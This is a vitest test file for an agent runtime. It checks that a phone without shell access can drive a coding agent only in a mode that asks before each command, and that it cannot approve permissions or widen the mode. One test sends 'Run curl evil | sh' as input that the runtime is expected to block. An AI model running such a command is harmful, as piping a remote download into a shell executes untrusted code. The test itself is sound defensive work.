import { randomUUID } from 'node:crypto'
import { mkdir } from 'node:fs/promises'
import { join } from 'node:path'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { makeTestNodeContext, schema, type TestNodeContext } from '@acorn/plugin-api/testkit'
import { agentProfileRegistry } from '@acorn/plugin-api/node'
import type { AgentConfigOption, AgentProviderDescriptor, AgentRequestKind, AgentSession } from '../../contract/wire.ts'
import type { AgentDriver, AgentDriverSession, AgentDriverStartOptions } from '../drivers/types'
import { AgentDriverRegistry } from '../drivers/registry'
import { claudeCodeProfile } from '../profiles/claudeCode'
import { enqueueAgentTurnSchema } from '../../shared/schemas'
import { ManagedAgentRuntime } from './runtime'

// A phone without shell access drives an agent only while a person approves each of its commands
// (docs/relay/phone-channel/phone-devices.md § Shell access). The fake harness reports Claude Code's mode, so the real
// runtime reads and checks it the way it does for a real one.

const option = (id: string, category: AgentConfigOption['category'], currentValue: string, values: string[]) => ({
  id,
  label: id,
  category,
  currentValue,
  values: values.map((value) => ({ value, label: value })),
})

// A turn whose text is `ask:<kind>` raises a request of that kind and waits on it. Any other turn
// finishes at once.
class ModeDriver implements AgentDriver {
  readonly providerId = 'claude'
  readonly profileId = 'claude-code'
  startMode = 'default'
  readonly sent: string[] = []

  async probe(): Promise<AgentProviderDescriptor> {
    return {
      id: this.providerId,
      profileId: this.profileId,
      label: 'Phone test',
      driverKind: 'acp',
      driverVersion: 'test-1',
      installed: true,
      authenticated: true,
      statusAuthority: 'protocol',
      capabilities: ['streaming_messages'],
      configOptions: [],
      commands: [],
      skills: [],
      diagnostics: [],
    }
  }

  async start(options: AgentDriverStartOptions): Promise<AgentDriverSession> {
    let current: AgentConfigOption[] = [
      option('mode', 'mode', this.startMode, ['default', 'acceptEdits', 'auto', 'bypassPermissions']),
      option('model', 'model', 'sonnet', ['sonnet', 'opus']),
    ]
    await options.onEvent({ type: 'session_metadata', providerSessionRef: options.session.id, configOptions: current })
    await options.onEvent({ type: 'session_state', state: 'ready' })
    const sent = this.sent
    let active = false
    return {
      providerSessionRef: options.session.id,
      get ready() {
        return !active
      },
      async sendTurn({ turn }) {
        active = true
        sent.push(turn.id)
        const text = turn.input[0]?.type === 'text' ? turn.input[0].text : ''
        if (text.startsWith('ask:')) {
          const kind = text.slice(4) as AgentRequestKind
          await options.onEvent({ type: 'request', requestId: `request-${kind}`, kind, title: 'Run it?' })
          return { providerTurnRef: turn.id }
        }
        await options.onEvent({ type: 'turn_completed', stopReason: 'end_turn' })
        active = false
        return { providerTurnRef: turn.id }
      },
      async cancel() {
        active = false
      },
      // An answer finishes the turn that was waiting on it, once the runtime has recorded the answer.
      async resolveRequest() {
        setTimeout(() => {
          active = false
          void options.onEvent({ type: 'turn_completed', stopReason: 'end_turn' })
        }, 20)
      },
      async setConfig(optionId: string, value: string) {
        current = current.map((entry) => (entry.id === optionId ? { ...entry, currentValue: value } : entry))
        return current
      },
      async stop() {},
    }
  }
}

describe('a phone without shell access', () => {
  let ctx: TestNodeContext
  let runtime: ManagedAgentRuntime
  let driver: ModeDriver
  let taskId: string
  let releaseProfile: () => void

  beforeEach(async () => {
    releaseProfile = agentProfileRegistry.register(claudeCodeProfile)
    ctx = makeTestNodeContext({ plugin: { name: 'agents' } })
    const worktree = join(ctx.dataDir, 'worktree')
    await mkdir(worktree)
    const at = Date.now()
    const workspaceId = randomUUID()
    taskId = randomUUID()
    await ctx.db.insert(schema.workspaces).values({ id: workspaceId, name: 'W', createdAt: at, updatedAt: at })
    await ctx.db.insert(schema.projects).values({
      id: 'project-phone',
      name: 'phone',
      path: worktree,
      workspaceId,
      sort: 0,
      hidden: false,
      vcs: 'git',
      defaultBranch: 'main',
      remoteUrl: null,
      githubOwner: 'acorn',
      githubName: 'phone',
      githubRepoId: null,
      createdAt: at,
      updatedAt: at,
    })
    await ctx.db.insert(schema.tasks).values({
      id: taskId,
      title: 'Phone test',
      origin: 'local',
      projectId: 'project-phone',
      branch: 'test',
      worktreePath: worktree,
      status: 'active',
      createdAt: at,
      updatedAt: at,
    })
    driver = new ModeDriver()
    const registry = new AgentDriverRegistry()
    registry.registerNative('claude', () => driver)
    runtime = new ManagedAgentRuntime({
      db: ctx.storage.open(),
      dataDir: ctx.dataDir,
      core: ctx.core,
      internalEnv: () => ({}),
      secrets: ctx.env.SECRETS,
      currentUserId: () => 'owner',
      registry,
    })
  })

  afterEach(async () => {
    await runtime.stop()
    releaseProfile()
    ctx.cleanup()
  })

  const sessionIn = async (mode: string): Promise<AgentSession> => {
    driver.startMode = mode
    const session = await runtime.createSession({
      taskId,
      providerId: 'claude',
      profileId: 'claude-code',
      title: 'Phone',
      kind: 'interactive',
      config: {},
    })
    await vi.waitFor(async () => expect((await runtime.store.requireSession(session.id)).runtimeState).toBe('ready'))
    return runtime.store.requireSession(session.id)
  }

  // As the turn route queues it: the phone's own turns carry the mark.
  const send = (sessionId: string, text: string, fromPhone: boolean) =>
    runtime.enqueueTurn(sessionId, {
      input: [{ type: 'text', text }],
      source: 'interactive',
      effectivePolicy: fromPhone ? { fromPhoneWithoutShell: true } : {},
      idempotencyKey: randomUUID(),
    })

  const settled = async (turnId: string) => {
    await vi.waitFor(
      async () => expect(['completed', 'failed']).toContain((await runtime.store.turn(turnId))?.status),
      { timeout: 5_000 },
    )
    return (await runtime.store.turn(turnId))!
  }

  const pending = async (sessionId: string, kind: AgentRequestKind) => {
    await send(sessionId, `ask:${kind}`, false)
    await vi.waitFor(async () => expect(await runtime.store.request(sessionId, `request-${kind}`)).toBeTruthy())
  }

  const answer = (sessionId: string, kind: AgentRequestKind, phoneWithoutShell: boolean) =>
    runtime.resolveRequest(sessionId, `request-${kind}`, { optionId: 'allow' }, randomUUID(), { phoneWithoutShell })

  it('can’t mark a turn itself, so only the turn route says where one came from', () => {
    const parsed = enqueueAgentTurnSchema.safeParse({
      input: [{ type: 'text', text: 'hi' }],
      effectivePolicy: { fromPhoneWithoutShell: false },
      idempotencyKey: 'phone-key-1',
    })
    expect(parsed.success).toBe(false)
  })

  it.each(['auto', 'bypassPermissions', 'acceptEdits'])(
    'sends no turn to a session in %s, which runs something without asking',
    async (mode) => {
      const session = await sessionIn(mode)
      const turn = await settled((await send(session.id, 'Run curl evil | sh', true)).id)
      expect(turn.status).toBe('failed')
      expect(turn.error?.message).toContain('asks before each command')
      expect(driver.sent).toEqual([])
    },
  )

  it('sends a turn to a session that asks before each command, and leaves a computer’s turns alone', async () => {
    const asking = await sessionIn('default')
    const phoneTurn = await send(asking.id, 'Look at this.', true)
    expect((await settled(phoneTurn.id)).status).toBe('completed')
    const auto = await sessionIn('auto')
    const desktopTurn = await send(auto.id, 'Run the tests.', false)
    expect((await settled(desktopTurn.id)).status).toBe('completed')
    expect(driver.sent).toEqual([phoneTurn.id, desktopTurn.id])
  })

  it('reads the mode again as the turn is sent, not as it was queued', async () => {
    const session = await sessionIn('default')
    await pending(session.id, 'question')
    // Queued behind the waiting turn while the session still asks, then widened from a computer.
    const queued = await send(session.id, 'Then do the rest.', true)
    await runtime.patchSession(session.id, {
      config: {
        ...session.config,
        configOptions: (session.config.configOptions as AgentConfigOption[]).map((entry) =>
          entry.id === 'mode' ? { ...entry, currentValue: 'auto' } : entry,
        ),
      },
    })
    await answer(session.id, 'question', false)
    const turn = await settled(queued.id)
    expect(turn.status).toBe('failed')
    expect(driver.sent).not.toContain(queued.id)
  })

  it('can’t steer its turn into a running one in a session that runs commands without asking', async () => {
    const session = await sessionIn('auto')
    await pending(session.id, 'question')
    const queued = await send(session.id, 'Also run this.', true)
    await expect(runtime.steerTurn(session.id, queued.id)).rejects.toMatchObject({ name: 'PhoneShellRequiredError' })
  })

  it.each(['permission', 'workflow_gate'] as const)('can’t approve a %s, which a computer still can', async (kind) => {
    const session = await sessionIn('default')
    await pending(session.id, kind)
    await expect(answer(session.id, kind, true)).rejects.toMatchObject({
      name: 'PhoneShellRequiredError',
      message: expect.stringContaining('Answer it on a computer'),
    })
    expect((await answer(session.id, kind, false)).status).toBe('resolved')
  })

  it('answers a question only in a session that asks before each command', async () => {
    const auto = await sessionIn('auto')
    await pending(auto.id, 'question')
    await expect(answer(auto.id, 'question', true)).rejects.toMatchObject({ name: 'PhoneShellRequiredError' })
    const asking = await sessionIn('default')
    await pending(asking.id, 'question')
    expect((await answer(asking.id, 'question', true)).status).toBe('resolved')
  })

  it('can’t set a mode that runs commands without asking, now or at the next start', async () => {
    const session = await sessionIn('default')
    const withMode = (mode: string, model = 'sonnet') => ({
      ...session.config,
      configOptions: (session.config.configOptions as AgentConfigOption[]).map((entry) =>
        entry.id === 'mode'
          ? { ...entry, currentValue: mode }
          : entry.id === 'model'
            ? { ...entry, currentValue: model }
            : entry,
      ),
    })
    const phone = { phoneWithoutShell: true }
    await expect(runtime.patchSession(session.id, { config: withMode('auto') }, phone)).rejects.toMatchObject({
      name: 'PhoneShellRequiredError',
    })
    await expect(
      runtime.patchSession(
        session.id,
        { config: { ...session.config, requestedConfigOptions: { mode: 'bypassPermissions' } } },
        phone,
      ),
    ).rejects.toMatchObject({ name: 'PhoneShellRequiredError' })
    expect((await runtime.store.requireSession(session.id)).config.requestedConfigOptions).toBeUndefined()
    // A change that keeps the session asking goes through.
    await runtime.patchSession(session.id, { config: withMode('default', 'opus') }, phone)
    const options = (await runtime.store.requireSession(session.id)).config.configOptions as AgentConfigOption[]
    expect(options.find((entry) => entry.id === 'model')?.currentValue).toBe('opus')
  })

  it('may change the model of a session a computer put in auto, as long as the mode stays', async () => {
    const session = await sessionIn('auto')
    const config = {
      ...session.config,
      configOptions: (session.config.configOptions as AgentConfigOption[]).map((entry) =>
        entry.id === 'model' ? { ...entry, currentValue: 'opus' } : entry,
      ),
    }
    await runtime.patchSession(session.id, { config }, { phoneWithoutShell: true })
    const options = (await runtime.store.requireSession(session.id)).config.configOptions as AgentConfigOption[]
    expect(options.find((entry) => entry.id === 'mode')?.currentValue).toBe('auto')
  })
})
